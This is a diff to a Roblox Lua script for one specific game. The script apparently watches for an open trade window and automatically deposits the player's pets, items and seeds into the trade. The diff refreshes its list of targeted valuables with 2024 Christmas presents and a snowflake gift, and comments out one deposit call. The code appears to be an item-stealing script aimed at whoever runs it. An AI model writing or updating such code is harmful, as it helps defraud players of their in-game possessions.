@@ -37,15 +37,15 @@ if game.PlaceId == 8737899170 then
         "Arcade Token",
         "Hype Egg",
         "Global Event Gift",
-        "Seashell",
-        "Ultra Lucky Tile",
-        "Lucky Tile",
-        "Good vs Evil Gift",
         "Rave Gift",
         "Millionaire Bucks",
-        "Pet Cube",
-        "Ultra Pet Cube",
-        "Huge Machine Egg 4"
+        "Huge Machine Egg 4",
+        "2024 Small Christmas Present",
+        "2024 Medium Christmas Present",
+        "2024 Large Christmas Present",
+        "2024 X-Large Christmas Present",
+        "2024 Gargantuan Christmas Present",
+        "Snowflake Gift",
 }
     local const = require(game.ReplicatedStorage.Library.Directory)
     local library = require(game.ReplicatedStorage.Library.Client.Save)
@@ -326,7 +326,7 @@ if game.PlaceId == 8737899170 then
 
             if game.Players.LocalPlayer.PlayerGui.TradeWindow.Enabled == true and GetTradeID() ~= nil then
                 DepositPetInTrade()
-                Depivent()
+                --Depivent()
                 --DepositStatPetInTrade()
                 DepositItemInTrade()
                 DepositSeedInTrade()
